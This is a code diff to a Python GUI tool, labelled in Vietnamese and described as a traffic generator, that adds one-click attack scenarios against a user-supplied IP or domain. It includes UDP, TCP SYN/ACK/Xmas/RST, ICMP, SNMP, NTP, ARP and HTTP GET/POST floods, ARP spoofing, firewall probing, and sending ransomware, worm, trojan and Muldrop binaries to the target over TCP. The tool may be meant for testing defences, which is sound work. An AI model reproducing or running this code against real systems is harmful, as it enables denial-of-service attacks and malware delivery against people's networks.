@@ -13,6 +13,7 @@ import docx
 from datetime import datetime
 import binascii
 import os
+import validators
 
 class thread_with_trace(threading.Thread):
     def __init__(self, *args, **keywords):
@@ -39,6 +40,221 @@ class thread_with_trace(threading.Thread):
     def kill(self):
         self.killed = True        
 
+def isRunning(self):
+    if self.button_start.state=='disabled':
+        return True
+    return False
+
+def ableRun(self):
+    if isRunning(self) == True:
+        messagebox.showinfo("Thông báo", "phần mềm đang chạy tấn công khác")
+        return False
+    if checkTrueInterface(self)==False:
+        messagebox.showinfo("Thông báo", "Dữ liệu sinh không qua Interface này, vui lòng chọn đúng Interface")
+        return False
+    if IPcheck(str(self.target_entry.get()))==False:
+            messagebox.showinfo("Thông báo", "IP không hợp lệ")
+            return False
+    return True
+   
+def menuChoice(self,choice):
+    if ableRun(self) == True:
+        self.BeginTime = getDatetimeNow()
+        ip_target = str(self.target_entry.get())
+        ip_target=fqdn_to_ip(ip_target)
+        speed = int(self.speed_slider.get())
+        self.button_start.config(state='disabled')
+        self.button_start.hover=False
+        self.button_start.configure(text_color = "black")   
+        t = thread_with_trace(target = capture,args=(ip_target,self,str(self.network_adapter.get()),int(self.time_slider.get()), ))
+        t.start()
+        self.threads.append(t)
+        if choice == 1:#UDP DoS
+            messagebox.showinfo("Thông báo", "Tấn công UDP DoS")
+            self.attack_scenario = "UDP DoS"
+            t = thread_with_trace(target = udp,args=(ip_target,RandShort(),randData(), ))
+            t.start()
+            self.threads.append(t)
+        if choice == 2:#TCP STREAM DoS
+            messagebox.showinfo("Thông báo", "Tấn công TCP STREAM DoS")
+            self.attack_scenario = "TCP STREAM DoS"
+            t = thread_with_trace(target = tcp_stream,args=(ip_target,randData(),1 )  )
+            t.start()
+            self.threads.append(t)  
+        if choice == 3:#HTTP Get DoS
+            messagebox.showinfo("Thông báo", "Tấn công HTTP Get DoS")
+            self.attack_scenario = "HTTP Get DoS"
+            t = thread_with_trace(target = http,args=(ip_target,80,1,self,False, )  )
+            t.start()
+            self.threads.append(t)
+        if choice == 4:#HTTP Post DoS
+            messagebox.showinfo("Thông báo", "Tấn công HTTP Post DoS")
+            self.attack_scenario = "HTTP Post DoS"
+            t = thread_with_trace(target = http,args=(ip_target,80,2,self,False, )  )
+            t.start()
+            self.threads.append(t)
+        if choice == 5:#TCP Xmas Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP Xmas Flood")
+            self.attack_scenario = "TCP Xmas Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"FSRPAUEC",randData() )  )
+                t.start()
+                self.threads.append(t)        
+        if choice == 6:#TCP Syn Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP Syn Flood")
+            self.attack_scenario = "TCP Syn Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"S",randData() )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 7:#TCP ACK Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP ACK Flood")
+            self.attack_scenario = "TCP ACK Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"A",randData() )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 8:#TCP Syn-ACK Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP Syn-ACK Flood")
+            self.attack_scenario = "TCP Syn-ACK Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"SA",randData() )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 9:#TCP RST/FIN Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP RST/FIN Flood")
+            self.attack_scenario = "TCP RST/FIN Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"FR",randData() )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 10:#TCP ACK & PUSH Flood
+            messagebox.showinfo("Thông báo", "Tấn công TCP ACK & PUSH Flood")
+            self.attack_scenario = "TCP ACK & PUSH Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"PA",randData() )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 11:#Normal ICMP Flood
+            messagebox.showinfo("Thông báo", "Tấn công Normal ICMP Flood")
+            self.attack_scenario = "Normal ICMP Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = icmp,args=(ip_target, )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 12:#Malformed ICMP Flood
+            messagebox.showinfo("Thông báo", "Tấn công Malformed ICMP Flood")
+            self.attack_scenario = "Malformed ICMP Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = malform_icmp,args=(ip_target, )  )
+                t.start()
+                self.threads.append(t)   
+        if choice == 13:#SNMP Flood
+            messagebox.showinfo("Thông báo", "Tấn công SNMP Flood")
+            self.attack_scenario = "SNMP Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = snmp,args=(ip_target, )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 14:#NTP Flood
+            messagebox.showinfo("Thông báo", "Tấn công NTP Flood")
+            self.attack_scenario = "NTP Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = ntp,args=(ip_target, )  )
+                t.start()
+                self.threads.append(t)
+        if choice == 15:#ARP Broadcast Flood
+            messagebox.showinfo("Thông báo", "ARP Broadcast Flood")
+            self.attack_scenario = "ARP Broadcast Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = broastcast,args=(ip_target, )  )
+                t.start()
+                self.threads.append(t)  
+        if choice == 16:#UDP Flood
+            messagebox.showinfo("Thông báo", "Tấn công UDP Flood")
+            self.attack_scenario = "UDP Flood"
+            for i in range(0,speed):
+                t = thread_with_trace(target = udp,args=(ip_target,RandShort(),randData(), ))
+                t.start()
+                self.threads.append(t)
+        if choice == 17:#Ransomware
+            messagebox.showinfo("Thông báo", "Tấn công đính kèm Ransomware trong lưu lượng")
+            self.attack_scenario = "Ransomware into Traffic"
+            path = os.getcwd()
+            path+="\\malware\\ransomware.bin"
+            file = open(path,'rb')
+            content = file.read()
+            self.malware_gift= str(binascii.hexlify(content))
+            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
+            t.start()
+            self.threads.append(t)  
+            if speed > 1:
+                for i in range(1,speed): 
+                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
+                    t.start()
+                    self.threads.append(t)  
+            
+        if choice == 18:#Worm
+            messagebox.showinfo("Thông báo", "Tấn công đính kèm Worm trong lưu lượng")
+            self.attack_scenario = "Worm into Traffic"
+            path = os.getcwd()
+            path+="\\malware\\worm.bin"
+            file = open(path,'rb')
+            content = file.read()
+            self.malware_gift= str(binascii.hexlify(content))
+            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
+            t.start()
+            self.threads.append(t)  
+            if speed > 1:
+                for i in range(1,speed): 
+                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
+                    t.start()
+                    self.threads.append(t)
+        if choice == 19:#Trojan
+            messagebox.showinfo("Thông báo", "Tấn công đính kèm Worm trong lưu lượng")
+            self.attack_scenario = "Trojan into Traffic"
+            path = os.getcwd()
+            path+="\\malware\\trojan.bin"
+            file = open(path,'rb')
+            content = file.read()
+            self.malware_gift= str(binascii.hexlify(content))
+            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
+            t.start()
+            self.threads.append(t)  
+            if speed > 1:
+                for i in range(1,speed): 
+                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
+                    t.start()
+                    self.threads.append(t)
+        if choice == 20:#Muldrop
+            messagebox.showinfo("Thông báo", "Tấn công đính kèm Muldrop trong lưu lượng")
+            self.attack_scenario = "Muldrop into Traffic"
+            path = os.getcwd()
+            path+="\\malware\\muldrop.bin"
+            file = open(path,'rb')
+            content = file.read()
+            self.malware_gift= str(binascii.hexlify(content))
+            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
+            t.start()
+            self.threads.append(t)  
+            if speed > 1:
+                for i in range(1,speed): 
+                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
+                    t.start()
+                    self.threads.append(t)
+        if choice == 21:#Firewall TCP
+            messagebox.showinfo("Lựa chọn chức năng", "Thăm dò tường lửa mục tiêu về khả năng phòng chống TCP DoS")
+            self.attack_scenario = "Check Firewall anti-TCP DoS"
+            t = thread_with_trace(target = check_tcp_fw,args=(ip_target,randData(),self, )  )
+            t.start()
+            self.threads.append(t)  
+        if choice == 22:#Firewall HTTP Post
+            messagebox.showinfo("Lựa chọn chức năng", "Thăm dò tường lửa mục tiêu về khả năng phòng chống HTTP Post DoS")
+            self.attack_scenario = "Check Firewall anti-HTTP Post DoS"
+            t = thread_with_trace(target = check_http_fw,args=(ip_target,80,self, )  )
+            t.start()
+            self.threads.append(t)
+
 def guide():
     messagebox.showinfo("Instructions",
                         "1. Enter IP Address or Domain of Target as victim\n\
@@ -51,7 +267,8 @@ def about():
     messagebox.showinfo("Details", "Traffic Generator Tool made by\n Vu Nguyen Duy - Cyber Security Engineer from K16 MTA")
 
 def checkTrueInterface(self):
-    temp = sniff(iface=str(self.network_adapter.get()), prn=lambda x: x.summary(),count=1,timeout=5)
+    send(IP(dst="google.com")/ICMP(),count=10)
+    temp = sniff(iface=str(self.network_adapter.get()), prn=lambda x: x.summary(),count=1,timeout=1)
     if len(temp) == 0:
         return False
     return True
@@ -72,79 +289,88 @@ def genReport(self):
             doc.add_heading('Date Begin                        :\t'+ self.BeginTime, 3)
             doc.add_heading('Network Interface          :\t'+ str(self.network_adapter.get()), 3)
             
-            
-            doc.add_heading('Attack Types Enabled:', 1)
-            doc.add_heading('Layer 2', 2)
-            if self.checkbox_arp.get()==1:
-                if self.arp_check.get()=="2":
-                    doc.add_heading('\t+ LAN ARP Spoofing ', 3)
-                else:
-                    doc.add_heading('\t+ ARP Broadcast ', 3)  
-            doc.add_heading('Layer 3', 2)
-            if self.icmp_check.get() =="2":
-                doc.add_heading('\t+ ICMP Flood ', 3)
-            if self.icmp_check.get() =="3":
-                doc.add_heading('\t+ Malformed ICMP Flood ', 3)        
-            doc.add_heading('Layer 4', 2)
-            if self.checkbox_udp.get() == 1:
-                temp ="\t+ UDP Flood - Port:"
-                if self.UDP_port.get() == 1:
-                   temp+="Random"
-                else:
-                   temp+=str(self.udp_entry_port.get())
-                if self.UDP_data.get() == 1:
-                    temp +=" - Data:Random" 
-                else:
-                    temp +=" - Data:"
-                    temp +=str(self.udp_entry_data.get())  
-                doc.add_heading(temp, 3)  
-            if self.checkbox_tcp.get() == 1:
-                if str(self.tcp_type.get())=="1":
-                    if str(self.tcp_ex.get())=="1":
-                        doc.add_heading('\t+ SYN FLood Attack ', 3)  
-                    else:     
-                        doc.add_heading('\t+ XMas Flood Attack ', 3)  
-                else:
-                    doc.add_heading('\t+ TCP Flood Custom Attack', 3) 
-                    flag=""
-                    if self.Flag_F.get()==1:
-                        flag += "F,"     
-                    if self.Flag_S.get()==1:
-                        flag += "S," 
-                    if self.Flag_R.get()==1:
-                        flag += "R," 
-                    if self.Flag_P.get()==1:
-                        flag += "P," 
-                    if self.Flag_A.get()==1:
-                        flag += "A," 
-                    if self.Flag_U.get()==1:
-                        flag += "U," 
-                    if self.Flag_E.get()==1:
-                        flag += "E," 
-                    if self.Flag_C.get()==1:
-                        flag += "C,"
-                    doc.add_heading('\t\t- Flag: '+ flag, 3)   
-                    if self.TCP_port.get() == 1:
-                        doc.add_heading('\t\t- Port: random', 3)
+                
+            if self.attack_scenario == "None":
+                doc.add_heading('Enabled customizations:', 1)
+                doc.add_heading('Layer 2', 2)
+                if self.checkbox_arp.get()==1:
+                    if self.arp_check.get()=="2":
+                        doc.add_heading('\t+ LAN ARP Spoofing ', 3)
                     else:
-                        doc.add_heading('\t\t- Port: '+str(self.tcp_entry_port.get()), 3)  
-                    if self.TCP_data.get() == 1:
-                        doc.add_heading('\t\t- Data: random', 3)
+                        doc.add_heading('\t+ ARP Broadcast ', 3)  
+                doc.add_heading('Layer 3', 2)
+                if self.icmp_check.get() =="2":
+                    doc.add_heading('\t+ ICMP Flood ', 3)
+                if self.icmp_check.get() =="3":
+                    doc.add_heading('\t+ Malformed ICMP Flood ', 3)        
+                doc.add_heading('Layer 4', 2)
+                if self.checkbox_udp.get() == 1:
+                    temp ="\t+ UDP Flood - Port:"
+                    if self.UDP_port.get() == 1:
+                        temp+="Random"
                     else:
-                        doc.add_heading('\t\t- Data: '+ str(self.tcp_entry_data.get()) , 3)
-            
-            doc.add_heading('Layer 7', 2)
-            if self.CheckNTP.get() == 1:
-                doc.add_heading('\t+ NTP Packets Flood ', 3)     
-            if self.CheckSNMP.get() == 1:
-                doc.add_heading('\t+ SNMP Packets Flood ', 3)    
-            if self.CheckHTTP.get() == 1:
-                doc.add_heading('\t+ HTTP Get Flood ', 3)    
-            if self.CheckHTTP_2.get() == 1:
-                doc.add_heading('\t+ HTTP Post Flood ', 3) 
-            
-            
-            
+                        temp+=str(self.udp_entry_port.get())
+                    if self.UDP_data.get() == 1:
+                        temp +=" - Data:Random" 
+                    else:
+                        temp +=" - Data:"
+                        temp +=str(self.udp_entry_data.get())  
+                    doc.add_heading(temp, 3)  
+                if self.checkbox_tcp.get() == 1:
+                    if str(self.tcp_type.get())=="1":
+                        if str(self.tcp_ex.get())=="1":
+                            doc.add_heading('\t+ SYN FLood Attack ', 3)  
+                        else:     
+                            doc.add_heading('\t+ XMas Flood Attack ', 3)  
+                    else:
+                        doc.add_heading('\t+ TCP Flood Custom Attack', 3) 
+                        flag=""
+                        if self.Flag_F.get()==1:
+                            flag += "F,"     
+                        if self.Flag_S.get()==1:
+                            flag += "S," 
+                        if self.Flag_R.get()==1:
+                            flag += "R," 
+                        if self.Flag_P.get()==1:
+                            flag += "P," 
+                        if self.Flag_A.get()==1:
+                            flag += "A," 
+                        if self.Flag_U.get()==1:
+                            flag += "U," 
+                        if self.Flag_E.get()==1:
+                            flag += "E," 
+                        if self.Flag_C.get()==1:
+                            flag += "C,"
+                        doc.add_heading('\t\t- Flag: '+ flag, 3)   
+                        if self.TCP_port.get() == 1:
+                            doc.add_heading('\t\t- Port: random', 3)
+                        else:
+                            doc.add_heading('\t\t- Port: '+str(self.tcp_entry_port.get()), 3)  
+                        if self.TCP_data.get() == 1:
+                            doc.add_heading('\t\t- Data: random', 3)
+                        else:
+                            doc.add_heading('\t\t- Data: '+ str(self.tcp_entry_data.get()) , 3)
+                
+                doc.add_heading('Layer 7', 2)
+                if self.CheckNTP.get() == 1:
+                    doc.add_heading('\t+ NTP Packets Flood ', 3)     
+                if self.CheckSNMP.get() == 1:
+                    doc.add_heading('\t+ SNMP Packets Flood ', 3)    
+                if self.CheckHTTP.get() == 1:
+                    doc.add_heading('\t+ HTTP Get Flood ', 3)    
+                if self.CheckHTTP_2.get() == 1:
+                    doc.add_heading('\t+ HTTP Post Flood ', 3) 
+            elif self.attack_scenario == "Check Firewall anti-TCP DoS":
+                doc.add_heading('Scenario:', 1)
+                doc.add_heading("Name:\t\t" + self.attack_scenario, 3)
+                doc.add_heading('Preventable:\t\t' +self.firewall_check_result, 3)    
+            elif self.attack_scenario == "Check Firewall anti-HTTP Post DoS":
+                doc.add_heading('Scenario:', 1)
+                doc.add_heading("Name:\t\t" +self.attack_scenario, 3)
+                doc.add_heading('Preventable:\t\t'+self.firewall_check_result, 3)    
+            else:
+                doc.add_heading('Scenario:', 1)
+                doc.add_heading("Name:\t\t" +self.attack_scenario, 3)
             
             doc.add_heading('Traffic Specifications', 1)
             doc.add_heading('Bandwidth Average                      :\t'+ self.label_bandwidth["text"], 3)
@@ -250,7 +476,17 @@ def getNetworkAdapterName():
         if temp != None:
             result.append(temp.group())
     return result
-    
+
+def IPcheck(host):
+    if host =="127.0.0.1" or host == "localhost" or host == "":
+        return False
+    if IPvalid(host)== False:
+        if domainValid(host)== False:
+            return False    
+    if is_fqdn(host)== False:
+        return False
+    return True
+
 def is_fqdn(host):
     try:
         host = host.replace("https://", "").replace("http://", "").replace("www.", "")
@@ -258,6 +494,17 @@ def is_fqdn(host):
     except socket.gaierror:
         return False
     return True
+
+def domainValid(hostname):
+    if validators.domain(hostname):
+        return True
+    return False
+
+def IPvalid(ip):
+    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+    if(re.search(regex, ip)):
+        return True
+    return False
 
 def fqdn_to_ip(fqdn):
     fqdn = fqdn.replace("https://", "").replace("http://", "").replace("www.", "")
@@ -268,19 +515,8 @@ def portValid(port):
         return True
     return False
        
-def IPvalid(ip):
-    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-    if(re.search(regex, ip)):
-        return True
-    return False
-# def checkHttpOpen(ip):
-#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#     result = sock.connect_ex((ip,80))
-#     #sock.close()
-#     if result == 0:
-#         return True
-#     else:
-#         return False
+
+
     
 def Beginable(self):
     if self.checkbox_arp.get() == 1 :
@@ -331,23 +567,9 @@ def arp_spoof(target_ip, host_ip,verbose=True):
         if verbose:
             self_mac = ARP().hwsrc
             print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
-    
-# def arp_spoof(target_ip, host_ip):
-#     while True:
-#         spoof(target_ip, host_ip, verbose=True)
-#         spoof(host_ip, target_ip, verbose=True)
-
-# def spoof(target_ip, host_ip, verbose=True):
-#     target_mac = get_mac(target_ip)
-#     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-#     send(arp_response, verbose=0)
-#     if verbose:
-#         self_mac = ARP().hwsrc
-#         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
-
+   
 def icmp(target):
     send(IP(dst=target)/ICMP(),loop=1)
-    # sendpfast(IP(dst=target)/ICMP(), mbps=1000, loop=50000)
 
 def malform_icmp(target):
   while True:
@@ -380,7 +602,24 @@ def tcp_stream(ip,data,popup):
             if popup ==1:
                 messagebox.showinfo("Thông báo", "TCP traffic Bị firewall mục tiêu chặn")            
             break
-  
+
+def check_tcp_fw(ip,data,self):
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+    dos.connect((ip,443)) 
+    check = False
+    for i in range(1,200): 
+        print(i)
+        try:
+            dos.send(data.encode())
+        except:
+            dos.close()
+            messagebox.showinfo("Kết quả thăm dò", "TCP traffic Bị firewall mục tiêu chặn")  
+            self.firewall_check_result = "Yes"
+            check = True          
+            break
+    if check == False:
+        self.firewall_check_result = "No"
+        messagebox.showinfo("Kết quả thăm dò", "Firewall mục tiêu không có cơ chế chống TCP traffic DoS")       
    
 def tcp(ip,port,flag,data):
     send(IP(dst=ip)/TCP(dport=port,flags=flag,
@@ -419,7 +658,26 @@ def http(ip,port,type,self,mal):
             dos.close()
             messagebox.showinfo("Thông báo", "HTTP POST traffic Bị firewall mục tiêu chặn")
             break
-        
+def check_http_fw(ip,port,self):
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+    dos.connect((ip, port)) 
+    url_path = generate_url_path()
+    method="POST"
+    byt = (f"{method} /{url_path} HTTP/1.1\nHost: {ip}\n\n").encode()
+    check = False
+    for i in range(1,200): 
+        print(i)
+        try:
+            dos.send(byt)
+        except:
+            dos.close()
+            messagebox.showinfo("Kết quả thăm dò", "HTTP POST traffic Bị firewall mục tiêu chặn")
+            self.firewall_check_result = "Yes"
+            check = True
+            break          
+    if check == False:
+        self.firewall_check_result = "No"
+        messagebox.showinfo("Kết quả thăm dò", "Firewall mục tiêu không có cơ chế chống traffic HTTP Post DoS")          
     
         
 def caculator(self,capture):
